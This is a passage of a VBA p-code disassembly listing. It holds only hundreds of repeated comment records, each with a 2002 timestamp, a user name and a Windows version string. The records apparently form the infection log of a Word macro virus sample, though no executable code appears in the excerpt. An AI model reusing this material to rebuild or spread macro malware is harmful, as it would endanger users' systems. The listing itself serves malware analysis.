' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6325:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6326:
' Line #6327:
' Line #6328:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:47:22"
' Line #6329:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6330:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6331:
' Line #6332:
' Line #6333:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:47:38"
' Line #6334:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6335:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6336:
' Line #6337:
' Line #6338:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:47:56"
' Line #6339:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6340:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6341:
' Line #6342:
' Line #6343:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:48:08"
' Line #6344:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6345:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6346:
' Line #6347:
' Line #6348:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:48:28"
' Line #6349:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6350:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6351:
' Line #6352:
' Line #6353:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:48:57"
' Line #6354:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6355:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6356:
' Line #6357:
' Line #6358:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:49:11"
' Line #6359:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6360:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6361:
' Line #6362:
' Line #6363:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:49:19"
' Line #6364:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6365:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6366:
' Line #6367:
' Line #6368:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:49:26"
' Line #6369:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6370:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6371:
' Line #6372:
' Line #6373:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:49:34"
' Line #6374:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6375:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6376:
' Line #6377:
' Line #6378:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 17:50:53"
' Line #6379:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6380:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6381:
' Line #6382:
' Line #6383:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 22:51:06"
' Line #6384:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6385:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6386:
' Line #6387:
' Line #6388:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 23:01:40"
' Line #6389:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6390:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6391:
' Line #6392:
' Line #6393:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 23:02:06"
' Line #6394:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6395:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6396:
' Line #6397:
' Line #6398:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 23:02:34"
' Line #6399:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6400:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6401:
' Line #6402:
' Line #6403:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 23:04:31"
' Line #6404:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6405:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6406:
' Line #6407:
' Line #6408:
' 	QuoteRem 0x0000 0x0013 "18.02.2002 23:59:06"
' Line #6409:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6410:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6411:
' Line #6412:
' Line #6413:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 4:38:48"
' Line #6414:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6415:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6416:
' Line #6417:
' Line #6418:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 4:39:57"
' Line #6419:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6420:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6421:
' Line #6422:
' Line #6423:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 4:40:06"
' Line #6424:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6425:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6426:
' Line #6427:
' Line #6428:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 4:48:20"
' Line #6429:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6430:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6431:
' Line #6432:
' Line #6433:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 4:53:30"
' Line #6434:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6435:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6436:
' Line #6437:
' Line #6438:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 4:58:42"
' Line #6439:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6440:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6441:
' Line #6442:
' Line #6443:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 5:50:47"
' Line #6444:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6445:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6446:
' Line #6447:
' Line #6448:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 5:51:49"
' Line #6449:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6450:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6451:
' Line #6452:
' Line #6453:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 6:02:17"
' Line #6454:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6455:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6456:
' Line #6457:
' Line #6458:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 6:09:19"
' Line #6459:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6460:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6461:
' Line #6462:
' Line #6463:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 6:11:31"
' Line #6464:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6465:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6466:
' Line #6467:
' Line #6468:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 6:13:40"
' Line #6469:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6470:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6471:
' Line #6472:
' Line #6473:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 6:19:20"
' Line #6474:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6475:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6476:
' Line #6477:
' Line #6478:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 6:19:32"
' Line #6479:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6480:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6481:
' Line #6482:
' Line #6483:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 6:19:41"
' Line #6484:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6485:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6486:
' Line #6487:
' Line #6488:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 6:19:56"
' Line #6489:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6490:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6491:
' Line #6492:
' Line #6493:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 6:20:21"
' Line #6494:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6495:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6496:
' Line #6497:
' Line #6498:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 6:29:42"
' Line #6499:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6500:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6501:
' Line #6502:
' Line #6503:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 6:32:55"
' Line #6504:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6505:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6506:
' Line #6507:
' Line #6508:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 6:33:40"
' Line #6509:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6510:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6511:
' Line #6512:
' Line #6513:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 6:34:25"
' Line #6514:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6515:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6516:
' Line #6517:
' Line #6518:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 6:38:14"
' Line #6519:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6520:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6521:
' Line #6522:
' Line #6523:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 6:39:02"
' Line #6524:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6525:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6526:
' Line #6527:
' Line #6528:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 6:48:00"
' Line #6529:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6530:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6531:
' Line #6532:
' Line #6533:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 7:50:42"
' Line #6534:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6535:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6536:
' Line #6537:
' Line #6538:
' 	QuoteRem 0x0000 0x0012 "19.02.2002 7:50:53"
' Line #6539:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6540:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6541:
' Line #6542:
' Line #6543:
' 	QuoteRem 0x0000 0x0013 "19.02.2002 20:29:50"
' Line #6544:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6545:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6546:
' Line #6547:
' Line #6548:
' 	QuoteRem 0x0000 0x0013 "19.02.2002 21:38:07"
' Line #6549:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6550:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6551:
' Line #6552:
' Line #6553:
' 	QuoteRem 0x0000 0x0013 "19.02.2002 21:38:57"
' Line #6554:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6555:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6556:
' Line #6557:
' Line #6558:
' 	QuoteRem 0x0000 0x0013 "19.02.2002 21:40:03"
' Line #6559:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6560:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6561:
' Line #6562:
' Line #6563:
' 	QuoteRem 0x0000 0x0013 "19.02.2002 21:48:21"
' Line #6564:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6565:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6566:
' Line #6567:
' Line #6568:
' 	QuoteRem 0x0000 0x0013 "19.02.2002 22:42:26"
' Line #6569:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6570:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6571:
' Line #6572:
' Line #6573:
' 	QuoteRem 0x0000 0x0013 "19.02.2002 22:43:03"
' Line #6574:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6575:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6576:
' Line #6577:
' Line #6578:
' 	QuoteRem 0x0000 0x0013 "19.02.2002 22:45:55"
' Line #6579:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6580:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6581:
' Line #6582:
' Line #6583:
' 	QuoteRem 0x0000 0x0013 "19.02.2002 23:43:08"
' Line #6584:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6585:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6586:
' Line #6587:
' Line #6588:
' 	QuoteRem 0x0000 0x0012 "20.02.2002 0:37:21"
' Line #6589:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6590:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6591:
' Line #6592:
' Line #6593:
' 	QuoteRem 0x0000 0x0012 "20.02.2002 6:45:35"
' Line #6594:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6595:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6596:
' Line #6597:
' Line #6598:
' 	QuoteRem 0x0000 0x0012 "20.02.2002 6:45:55"
' Line #6599:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6600:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6601:
' Line #6602:
' Line #6603:
' 	QuoteRem 0x0000 0x0012 "20.02.2002 8:26:29"
' Line #6604:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6605:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6606:
' Line #6607:
' Line #6608:
' 	QuoteRem 0x0000 0x0012 "20.02.2002 8:26:40"
' Line #6609:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6610:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6611:
' Line #6612:
' Line #6613:
' 	QuoteRem 0x0000 0x0012 "20.02.2002 8:26:52"
' Line #6614:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6615:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6616:
' Line #6617:
' Line #6618:
' 	QuoteRem 0x0000 0x0012 "21.02.2002 5:16:44"
' Line #6619:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6620:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6621:
' Line #6622:
' Line #6623:
' 	QuoteRem 0x0000 0x0012 "21.02.2002 5:17:13"
' Line #6624:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6625:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6626:
' Line #6627:
' Line #6628:
' 	QuoteRem 0x0000 0x0012 "21.02.2002 5:18:08"
' Line #6629:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6630:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6631:
' Line #6632:
' Line #6633:
' 	QuoteRem 0x0000 0x0013 "21.02.2002 12:48:29"
' Line #6634:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6635:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6636:
' Line #6637:
' Line #6638:
' 	QuoteRem 0x0000 0x0013 "21.02.2002 14:19:32"
' Line #6639:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6640:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6641:
' Line #6642:
' Line #6643:
' 	QuoteRem 0x0000 0x0013 "21.02.2002 14:22:15"
' Line #6644:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6645:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6646:
' Line #6647:
' Line #6648:
' 	QuoteRem 0x0000 0x0013 "21.02.2002 19:35:19"
' Line #6649:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6650:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6651:
' Line #6652:
' Line #6653:
' 	QuoteRem 0x0000 0x0013 "21.02.2002 21:45:54"
' Line #6654:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6655:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6656:
' Line #6657:
' Line #6658:
' 	QuoteRem 0x0000 0x0013 "21.02.2002 22:56:20"
' Line #6659:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6660:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6661:
' Line #6662:
' Line #6663:
' 	QuoteRem 0x0000 0x0013 "21.02.2002 22:57:35"
' Line #6664:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6665:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6666:
' Line #6667:
' Line #6668:
' 	QuoteRem 0x0000 0x0013 "21.02.2002 22:57:37"
' Line #6669:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6670:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6671:
' Line #6672:
' Line #6673:
' 	QuoteRem 0x0000 0x0013 "21.02.2002 23:00:07"
' Line #6674:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6675:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6676:
' Line #6677:
' Line #6678:
' 	QuoteRem 0x0000 0x0013 "21.02.2002 23:01:28"
' Line #6679:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6680:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6681:
' Line #6682:
' Line #6683:
' 	QuoteRem 0x0000 0x0013 "21.02.2002 23:01:58"
' Line #6684:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6685:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6686:
' Line #6687:
' Line #6688:
' 	QuoteRem 0x0000 0x0013 "21.02.2002 23:01:59"
' Line #6689:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6690:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6691:
' Line #6692:
' Line #6693:
' 	QuoteRem 0x0000 0x0013 "21.02.2002 23:41:34"
' Line #6694:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6695:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6696:
' Line #6697:
' Line #6698:
' 	QuoteRem 0x0000 0x0013 "21.02.2002 23:49:51"
' Line #6699:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6700:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6701:
' Line #6702:
' Line #6703:
' 	QuoteRem 0x0000 0x0013 "21.02.2002 23:59:26"
' Line #6704:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6705:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6706:
' Line #6707:
' Line #6708:
' 	QuoteRem 0x0000 0x0012 "22.02.2002 0:00:27"
' Line #6709:
' 	QuoteRem 0x0000 0x0007 "Donskoi"
' Line #6710:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #6711:
' Line #6712:
' Line #6713:
' 	QuoteRem 0x0000 0x0011 "28.02.02 14:20:45"
' Line #6714:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6715:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6716:
' Line #6717:
' Line #6718:
' 	QuoteRem 0x0000 0x0011 "28.02.02 14:39:57"
' Line #6719:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6720:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6721:
' Line #6722:
' Line #6723:
' 	QuoteRem 0x0000 0x0011 "28.02.02 14:41:34"
' Line #6724:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6725:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6726:
' Line #6727:
' Line #6728:
' 	QuoteRem 0x0000 0x0011 "28.02.02 15:07:41"
' Line #6729:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6730:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6731:
' Line #6732:
' Line #6733:
' 	QuoteRem 0x0000 0x0011 "01.03.02 12:03:02"
' Line #6734:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6735:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6736:
' Line #6737:
' Line #6738:
' 	QuoteRem 0x0000 0x0011 "01.03.02 12:25:59"
' Line #6739:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6740:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6741:
' Line #6742:
' Line #6743:
' 	QuoteRem 0x0000 0x0011 "01.03.02 12:29:00"
' Line #6744:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6745:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6746:
' Line #6747:
' Line #6748:
' 	QuoteRem 0x0000 0x0011 "01.03.02 12:31:05"
' Line #6749:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6750:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6751:
' Line #6752:
' Line #6753:
' 	QuoteRem 0x0000 0x0011 "01.03.02 13:14:31"
' Line #6754:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6755:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6756:
' Line #6757:
' Line #6758:
' 	QuoteRem 0x0000 0x0011 "01.03.02 13:18:02"
' Line #6759:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6760:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6761:
' Line #6762:
' Line #6763:
' 	QuoteRem 0x0000 0x0011 "01.03.02 13:36:17"
' Line #6764:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6765:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6766:
' Line #6767:
' Line #6768:
' 	QuoteRem 0x0000 0x0011 "01.03.02 13:52:35"
' Line #6769:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6770:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6771:
' Line #6772:
' Line #6773:
' 	QuoteRem 0x0000 0x0011 "01.03.02 14:27:50"
' Line #6774:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6775:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6776:
' Line #6777:
' Line #6778:
' 	QuoteRem 0x0000 0x0011 "01.03.02 15:46:15"
' Line #6779:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6780:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6781:
' Line #6782:
' Line #6783:
' 	QuoteRem 0x0000 0x0011 "01.03.02 16:12:15"
' Line #6784:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6785:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6786:
' Line #6787:
' Line #6788:
' 	QuoteRem 0x0000 0x0011 "04.03.02 12:21:26"
' Line #6789:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6790:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6791:
' Line #6792:
' Line #6793:
' 	QuoteRem 0x0000 0x0011 "04.03.02 14:38:37"
' Line #6794:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6795:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6796:
' Line #6797:
' Line #6798:
' 	QuoteRem 0x0000 0x0011 "05.03.02 10:15:06"
' Line #6799:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6800:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6801:
' Line #6802:
' Line #6803:
' 	QuoteRem 0x0000 0x0011 "05.03.02 10:15:38"
' Line #6804:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6805:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6806:
' Line #6807:
' Line #6808:
' 	QuoteRem 0x0000 0x0011 "05.03.02 10:16:40"
' Line #6809:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6810:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6811:
' Line #6812:
' Line #6813:
' 	QuoteRem 0x0000 0x0011 "05.03.02 14:38:10"
' Line #6814:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6815:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6816:
' Line #6817:
' Line #6818:
' 	QuoteRem 0x0000 0x0011 "05.03.02 16:07:04"
' Line #6819:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6820:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6821:
' Line #6822:
' Line #6823:
' 	QuoteRem 0x0000 0x0011 "05.03.02 18:06:47"
' Line #6824:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6825:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6826:
' Line #6827:
' Line #6828:
' 	QuoteRem 0x0000 0x0010 "06.03.02 0:56:51"
' Line #6829:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6830:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6831:
' Line #6832:
' Line #6833:
' 	QuoteRem 0x0000 0x0010 "06.03.02 1:15:29"
' Line #6834:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6835:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6836:
' Line #6837:
' Line #6838:
' 	QuoteRem 0x0000 0x0010 "06.03.02 1:25:31"
' Line #6839:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6840:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6841:
' Line #6842:
' Line #6843:
' 	QuoteRem 0x0000 0x0010 "06.03.02 1:26:38"
' Line #6844:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6845:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6846:
' Line #6847:
' Line #6848:
' 	QuoteRem 0x0000 0x0010 "06.03.02 1:28:13"
' Line #6849:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6850:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6851:
' Line #6852:
' Line #6853:
' 	QuoteRem 0x0000 0x0011 "06.03.02 13:40:10"
' Line #6854:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6855:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6856:
' Line #6857:
' Line #6858:
' 	QuoteRem 0x0000 0x0011 "06.03.02 14:26:57"
' Line #6859:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6860:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #6861:
' Line #6862:
' Line #6863:
' 	QuoteRem 0x0000 0x0011 "06.03.02 14:30:59"
' Line #6864:
' 	QuoteRem 0x0000 0x0005 "*****"
' Line #6865:
